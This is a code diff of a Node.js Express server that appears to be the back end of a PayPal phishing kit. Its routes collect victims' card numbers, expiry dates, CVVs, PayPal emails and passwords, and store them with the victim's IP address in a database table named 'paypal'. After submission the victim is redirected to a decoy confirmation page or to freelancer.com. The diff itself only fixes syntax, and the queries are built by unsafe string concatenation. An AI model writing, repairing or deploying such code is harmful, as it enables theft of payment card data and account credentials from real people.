@@ -54,6 +54,8 @@ app.post('/visa', function (req, res) {
     client.query("Insert into paypal (card,exp,cvv,country,ip) values('" + a + "','" + b + "','" + c + "','"+location+"','"+ip+ "')", function (err, result) {
         console.log('resulttttttttttttt : ' + result)
         console.log('errrrrrrrrrrrrrrrrrrrrrr : ' + err)
+        
+    });
     })
 })
 app.post('/paypala', function (req, res) {
@@ -71,8 +73,10 @@ var ip = req.headers['x-forwarded-for'] ||
 
     client.query("Insert into paypal (mail,pass,country,ip) values('" + a + "','" + b + "','"+location+"','"+ip+"')", function (err, result) { });
 
+    });
     res.redirect('/confirm')
-})
+});
+
 app.post('/paypalb', function (req, res) {
     var a = req.body.cardHolder;
     var b = req.body.cardNumber;
@@ -90,8 +94,9 @@ var ip = req.headers['x-forwarded-for'] ||
     console.log(req.body);
     client.query("Insert into paypal (cardholder,card,exp,cvv,country,ip) values('" + a + "','" + b + "','" + c + "','" + d + "','"+location+"','"+ip+ "')", function (err, result) { });
 
+    });
     res.redirect('https://www.freelancer.com')
-})
+});
 
 
 
